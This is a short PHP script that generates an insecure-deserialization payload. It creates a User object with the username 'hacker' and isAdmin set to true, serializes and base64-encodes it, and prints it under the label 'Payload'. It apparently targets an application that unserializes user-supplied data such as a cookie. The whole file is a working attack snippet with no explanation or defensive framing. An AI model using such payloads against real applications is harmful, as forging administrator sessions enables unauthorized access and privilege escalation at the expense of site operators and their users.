<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}

$maliciousUser = new User();
$serializedData = serialize($maliciousUser);
$encodedData = base64_encode($serializedData); 

echo "Payload: " . $encodedData;
?>